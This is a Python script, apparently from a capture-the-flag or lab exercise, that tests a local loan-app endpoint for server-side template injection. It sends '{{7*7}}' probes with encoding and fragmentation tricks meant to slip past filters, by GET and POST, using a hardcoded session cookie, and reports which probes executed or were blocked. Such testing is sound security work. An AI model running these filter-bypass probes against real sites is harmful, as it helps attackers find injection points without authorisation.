import requests
import json
import urllib.parse

# Configuration
target_url = "http://127.0.0.1:32790/total_loan_payments"
session_cookie = "session=eyJ1c2VyX2lkIjoxfQ.aVlvKQ.Ahoc9Ula-DnHQaF2W1Cj0InvBaA"
headers = {
    "Cookie": session_cookie,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Test payloads with different encoding/fragmentation techniques
payloads = {
    "original": "{{7*7}}",
    "html_comment": "<!--{{7*7}}-->",
    "string_concat": "{{'{{' + '7*7' + '}}}}",
    "fragmented": "{{7*7 }}",
    "alternative_delim": "${7*7}",
    "url_encoded_std": "%7B%7B7*7%7D%7D",
    "url_encoded_aggressive": "%25257B%25257B7*72525257D%25257D",
    "nested_json": '{"key": "{{7*7}}"}'
}

print("="*80)
print("TESTING /total_loan_payments FOR TEMPLATE RENDERING BYPASS")
print("="*80)
print(f"Target: {target_url}")
print(f"Cookie: {session_cookie[:60]}...")
print("="*80)

# Test 1: GET requests with query parameters
print("\n[+] TESTING GET REQUESTS (query parameters)")
print("-" * 80)
get_results = []

for name, payload in payloads.items():
    print(f"\n[*] Testing: {name}")
    print(f"Payload: {payload}")
    
    try:
        response = requests.get(
            f"{target_url}?param={urllib.parse.quote(payload)}",
            headers=headers,
            timeout=10
        )
        
        print(f"Status: {response.status_code}")
        print(f"Response length: {len(response.text)}B")
        
        if "forbidden" in response.text.lower() or "blocked" in response.text.lower():
            print(f"[!] FILTER TRIGGERED - Forbidden/blocked detected")
        
        if "49" in response.text:
            print(f"[!] TEMPLATE EXECUTED - '49' found in response")
        
        try:
            json.loads(response.text)
            print(f"[+] JSON structure: VALID")
        except json.JSONDecodeError:
            print(f"[-] JSON structure: CORRUPTED")
        
        # Show first 300 chars of response
        print(f"Response preview: {response.text[:300]}")
        
        get_results.append({
            "name": name,
            "payload": payload,
            "status": response.status_code,
            "executed": "49" in response.text,
            "filtered": "forbidden" in response.text.lower() or "blocked" in response.text.lower(),
            "json_valid": True if json.loads(response.text) else False
        })
        
    except Exception as e:
        print(f"[-] Error: {e}")

# Test 2: POST with application/json
print("\n" + "="*80)
print("[+] TESTING POST REQUESTS (application/json)")
print("-" * 80)
post_results = []

json_headers = headers.copy()
json_headers["Content-Type"] = "application/json"

for name, payload in payloads.items():
    print(f"\n[*] Testing: {name}")
    print(f"Payload: {payload}")
    
    try:
        # Try to send payload directly in JSON body
        if name == "nested_json":
            # This one is already JSON formatted
            data = json.loads(payload)
        else:
            # Send as {"param": payload}
            data = {"param": payload}
        
        response = requests.post(
            target_url,
            headers=json_headers,
            json=data,
            timeout=10
        )
        
        print(f"Status: {response.status_code}")
        print(f"Response length: {len(response.text)}B")
        
        if "forbidden" in response.text.lower() or "blocked" in response.text.lower():
            print(f"[!] FILTER TRIGGERED - Forbidden/blocked detected")
        
        if "49" in response.text:
            print(f"[!] TEMPLATE EXECUTED - '49' found in response")
        
        try:
            json.loads(response.text)
            print(f"[+] JSON structure: VALID")
        except json.JSONDecodeError:
            print(f"[-] JSON structure: CORRUPTED")
        
        # Show first 300 chars of response
        print(f"Response preview: {response.text[:300]}")
        
        post_results.append({
            "name": name,
            "payload": payload,
            "status": response.status_code,
            "executed": "49" in response.text,
            "filtered": "forbidden" in response.text.lower() or "blocked" in response.text.lower(),
            "json_valid": True if json.loads(response.text) else False
        })
        
    except Exception as e:
        print(f"[-] Error: {e}")

# Summary
print("\n" + "="*80)
print("[+] SUMMARY OF RESULTS")
print("="*80)

print("\nGET Request Results:")
for result in get_results:
    print(f"  {result['name']:<25} | Status: {result['status']} | Filtered: {result['filtered']:<5} | Executed: {result['executed']:<5} | JSON Valid: {result['json_valid']}")

print("\nPOST Request Results:")
for result in post_results:
    print(f"  {result['name']:<25} | Status: {result['status']} | Filtered: {result['filtered']:<5} | Executed: {result['executed']:<5} | JSON Valid: {result['json_valid']}")

# Check if any execution succeeded
any_executed = any(r['executed'] for r in get_results + post_results)
if any_executed:
    print("\n[!] SUCCESS: Template execution detected in at least one method!")
else:
    print("\n[-] RESULT: No template execution detected in tested methods")

# Count filter triggers
filter_triggers = sum(1 for r in get_results + post_results if r['filtered'])
print(f"\n[+] Filter triggered in {filter_triggers} out of {len(get_results + post_results)} tests")

print("\n" + "="*80)

